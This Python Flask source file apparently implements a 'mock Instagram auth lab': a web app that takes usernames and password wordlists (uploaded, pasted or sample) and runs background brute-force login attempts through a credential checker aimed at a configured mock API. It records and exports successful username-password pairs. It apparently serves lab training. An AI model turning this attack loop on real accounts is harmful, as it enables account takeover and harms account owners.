"""
MOCKA — Mock Instagram auth lab
Flask app with instaloader traffic routed through mockapis.
"""

from __future__ import annotations

import logging
import os
import threading
import time
import uuid
from datetime import datetime
from pathlib import Path

from flask import Flask, jsonify, render_template, request, send_from_directory

from config import config
from file_processor import password_processor
from instagram_api import instagram_handler
from models import BFaTask, task_manager

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
)
logger = logging.getLogger(__name__)

BASE_DIR = Path(__file__).resolve().parent

app = Flask(
    __name__,
    static_folder=str(BASE_DIR / "static"),
    template_folder=str(BASE_DIR / "templates"),
)
app.secret_key = config.SECRET_KEY
app.config["MAX_CONTENT_LENGTH"] = config.MAX_FILE_SIZE

os.makedirs(config.UPLOAD_FOLDER, exist_ok=True)


def parse_usernames(raw: str) -> list[str]:
    parts = []
    for chunk in raw.replace("\n", ",").split(","):
        name = chunk.strip().lstrip("@")
        if name:
            parts.append(name)
    # preserve order, drop dupes
    seen = set()
    unique = []
    for name in parts:
        key = name.lower()
        if key not in seen:
            seen.add(key)
            unique.append(name)
    return unique


def collect_passwords_from_request():
    """Accept file upload, paste body, or sample wordlist."""
    source = (request.form.get("source") or "upload").strip().lower()
    filepath = None

    if source == "sample":
        sample = password_processor.sample_passwords_path()
        if not sample.exists():
            return None, {"success": False, "error": "Sample wordlist missing"}, 500
        result = password_processor.process_password_file(str(sample))
        return result, None, None

    if source == "paste" or (request.form.get("passwords") and "passwordFile" not in request.files):
        text = (request.form.get("passwords") or "").strip()
        if not text:
            return None, {"success": False, "error": "Paste at least one password"}, 400
        result = password_processor.process_password_text(text, label="pasted.txt")
        return result, None, None

    if "passwordFile" not in request.files:
        return None, {"success": False, "error": "No password file uploaded"}, 400

    file_storage = request.files["passwordFile"]
    if not file_storage or not file_storage.filename:
        return None, {"success": False, "error": "No file selected"}, 400

    filepath = password_processor.save_uploaded_file(file_storage)
    if not filepath:
        return None, {"success": False, "error": "Invalid file type. Use .txt, .csv, or .json"}, 400

    result = password_processor.process_password_file(filepath)
    if not result["success"]:
        password_processor.cleanup_file(filepath)
        return None, {"success": False, "error": result["error"]}, 500

    result["_filepath"] = filepath
    return result, None, None


@app.route("/")
def index():
    return render_template(
        "index.html",
        app_name=config.APP_NAME,
        tagline=config.APP_TAGLINE,
        replica_id=config.REPLICA_ID,
        mock_url=config.MOCK_API_BASE_URL,
        rate_limit=config.INSTAGRAM_RATE_LIMIT,
        max_concurrent=config.MAX_CONCURRENT_CHECKS,
    )


@app.route("/health")
def health():
    return jsonify(
        {
            "status": "healthy",
            "app": config.APP_NAME,
            "replica_id": config.REPLICA_ID,
            "target_url": config.MOCK_API_BASE_URL,
            "stats": task_manager.stats(),
            "timestamp": datetime.now().isoformat(),
        }
    )


@app.route("/api/meta")
def meta():
    return jsonify(
        {
            "success": True,
            "app": config.APP_NAME,
            "tagline": config.APP_TAGLINE,
            "mock_url": config.MOCK_API_BASE_URL,
            "replica_id": config.REPLICA_ID,
            "rate_limit": config.INSTAGRAM_RATE_LIMIT,
            "max_concurrent": config.MAX_CONCURRENT_CHECKS,
            "max_passwords": config.MAX_PASSWORDS,
            "stats": task_manager.stats(),
        }
    )


@app.route("/api/preview", methods=["POST"])
def preview_file():
    try:
        if request.form.get("passwords"):
            result = password_processor.process_password_text(request.form["passwords"])
            return jsonify(
                {
                    "success": result["success"],
                    "password_count": result["password_count"],
                    "filename": result["filename"],
                    "preview": result["passwords"][:8],
                }
            )

        if "passwordFile" not in request.files:
            return jsonify({"success": False, "error": "No file uploaded"}), 400

        file_storage = request.files["passwordFile"]
        if not file_storage.filename:
            return jsonify({"success": False, "error": "No file selected"}), 400

        temp_path = os.path.join(
            config.UPLOAD_FOLDER,
            f"temp_{uuid.uuid4()}_{password_processor.sanitize_filename(file_storage.filename)}",
        )
        file_storage.save(temp_path)
        try:
            result = password_processor.process_password_file(temp_path)
            return jsonify(
                {
                    "success": result["success"],
                    "password_count": result["password_count"],
                    "filename": result["filename"],
                    "preview": result["passwords"][:8],
                    "error": result.get("error"),
                }
            )
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)
    except Exception as exc:
        logger.exception("Preview error")
        return jsonify({"success": False, "error": str(exc)}), 500


@app.route("/api/sample")
def sample_wordlist():
    path = password_processor.sample_passwords_path()
    if not path.exists():
        return jsonify({"success": False, "error": "Sample missing"}), 404
    return send_from_directory(path.parent, path.name, as_attachment=True)


@app.route("/api/tasks", methods=["GET"])
def get_tasks():
    try:
        status = (request.args.get("status") or "").strip().lower()
        tasks = task_manager.get_all_tasks()
        if status:
            tasks = [t for t in tasks if t.status == status]
        return jsonify(
            {
                "success": True,
                "tasks": [t.to_dict() for t in tasks],
                "count": len(tasks),
                "stats": task_manager.stats(),
            }
        )
    except Exception as exc:
        logger.exception("Error getting tasks")
        return jsonify({"success": False, "error": str(exc)}), 500


@app.route("/api/tasks", methods=["POST"])
def create_task():
    try:
        usernames_raw = (request.form.get("usernames") or "").strip()
        if not usernames_raw:
            return jsonify({"success": False, "error": "Enter at least one username"}), 400

        usernames = parse_usernames(usernames_raw)
        if not usernames:
            return jsonify({"success": False, "error": "No valid usernames provided"}), 400

        stop_on_first = (request.form.get("stop_on_first") or "true").lower() in {
            "1",
            "true",
            "yes",
            "on",
        }

        result, err, code = collect_passwords_from_request()
        if err:
            return jsonify(err), code

        passwords = result["passwords"]
        if not passwords:
            filepath = result.get("_filepath")
            if filepath:
                password_processor.cleanup_file(filepath)
            return jsonify({"success": False, "error": "No passwords found"}), 400

        source = (request.form.get("source") or result.get("filename") or "upload").lower()
        if source not in ("upload", "paste", "sample"):
            source = "paste" if result.get("filename") == "pasted.txt" else "upload"

        task = task_manager.create_task(
            usernames=usernames,
            password_file=result.get("filename") or "passwords.txt",
            passwords=passwords,
            stop_on_first=stop_on_first,
            source=source,
            replica_id=config.REPLICA_ID,
        )

        filepath = result.get("_filepath")
        threading.Thread(
            target=process_task_background,
            args=(task.task_id, filepath),
            daemon=True,
        ).start()

        return jsonify(
            {
                "success": True,
                "task_id": task.task_id,
                "message": f"Started — {len(passwords)} passwords × {len(usernames)} usernames",
                "task": task.to_dict(),
            }
        )
    except Exception as exc:
        logger.exception("Error creating task")
        return jsonify({"success": False, "error": str(exc)}), 500


@app.route("/api/tasks/<task_id>", methods=["GET"])
def get_task(task_id: str):
    task = task_manager.get_task(task_id)
    if not task:
        return jsonify({"success": False, "error": "Task not found"}), 404
    return jsonify({"success": True, "task": task.to_dict()})


@app.route("/api/tasks/<task_id>/cancel", methods=["POST"])
def cancel_task(task_id: str):
    task = task_manager.cancel_task(task_id)
    if not task:
        return jsonify({"success": False, "error": "Task not found"}), 404
    return jsonify({"success": True, "message": "Cancel requested", "task": task.to_dict()})


@app.route("/api/tasks/<task_id>", methods=["DELETE"])
def delete_task(task_id: str):
    task = task_manager.get_task(task_id)
    if not task:
        return jsonify({"success": False, "error": "Task not found"}), 404
    if task.status in ("pending", "processing"):
        task.cancel_requested = True
        # give worker a beat, then delete
        time.sleep(0.05)
    if task.password_file and task.source == "upload":
        file_path = os.path.join(config.UPLOAD_FOLDER, task.password_file)
        password_processor.cleanup_file(file_path)
    task_manager.delete_task(task_id)
    return jsonify({"success": True, "message": "Task deleted"})


@app.route("/api/tasks/clear-finished", methods=["POST"])
def clear_finished():
    removed = task_manager.clear_finished()
    return jsonify({"success": True, "removed": removed, "stats": task_manager.stats()})


@app.route("/api/tasks/<task_id>/export", methods=["GET"])
def export_task(task_id: str):
    task = task_manager.get_task(task_id)
    if not task:
        return jsonify({"success": False, "error": "Task not found"}), 404
    payload = task.to_dict()
    payload["results"] = task.results  # full results for export
    return jsonify({"success": True, "export": payload})


def process_task_background(task_id: str, filepath: str | None) -> None:
    try:
        time.sleep(0.05)
        task = task_manager.get_task(task_id)
        if not task:
            logger.error("Task %s not found", task_id)
            return

        task.status = "processing"
        task.start_time = datetime.now()
        task_manager.update_task(task)
        logger.info(
            "Task %s: %s users × %s passwords via %s",
            task_id,
            len(task.usernames),
            len(task.passwords),
            config.MOCK_API_BASE_URL,
        )

        stop_all = False
        for username in task.usernames:
            if stop_all or task.cancel_requested:
                break

            for password_batch in password_processor.get_password_generator(
                task.passwords, config.BATCH_SIZE
            ):
                if stop_all or task.cancel_requested:
                    break

                for password in password_batch:
                    # refresh cancel flag
                    live = task_manager.get_task(task_id)
                    if not live or live.cancel_requested:
                        task.cancel_requested = True
                        stop_all = True
                        break

                    try:
                        result = instagram_handler.check_credentials(username, password)
                        task.progress += 1

                        entry = {
                            "username": username,
                            "password": password if result.success else "***",
                            "success": result.success,
                            "message": result.message,
                            "error_type": result.error_type,
                            "timestamp": datetime.now().isoformat(),
                        }
                        task.results.append(entry)

                        if result.success:
                            task.successful_logins.append(
                                {
                                    "username": username,
                                    "password": password,
                                    "profile": result.profile,
                                    "timestamp": datetime.now().isoformat(),
                                }
                            )
                            logger.info("HIT %s (mock)", username)
                            if task.stop_on_first:
                                stop_all = True
                                break
                        else:
                            task.failed_attempts += 1

                        task_manager.update_task(task)
                    except Exception as exc:
                        logger.error("Check failed %s: %s", username, exc)
                        task.failed_attempts += 1
                        task.progress += 1
                        task_manager.update_task(task)

                time.sleep(0.05)

        if task.cancel_requested:
            task.status = "cancelled"
        else:
            task.status = "completed"
        task.end_time = datetime.now()
        task_manager.update_task(task)
        logger.info(
            "Task %s %s — %s hits",
            task_id,
            task.status,
            len(task.successful_logins),
        )

        if filepath:
            password_processor.cleanup_file(filepath)
    except Exception as exc:
        logger.exception("Task %s crashed", task_id)
        task = task_manager.get_task(task_id)
        if task:
            task.status = "failed"
            task.error = str(exc)
            task.end_time = datetime.now()
            task_manager.update_task(task)


if __name__ == "__main__":
    logger.info("Starting %s on %s:%s", config.APP_NAME, config.HOST, config.PORT)
    logger.info("Mock target: %s", config.MOCK_API_BASE_URL)
    app.run(host=config.HOST, port=config.PORT, debug=config.DEBUG, threaded=True)
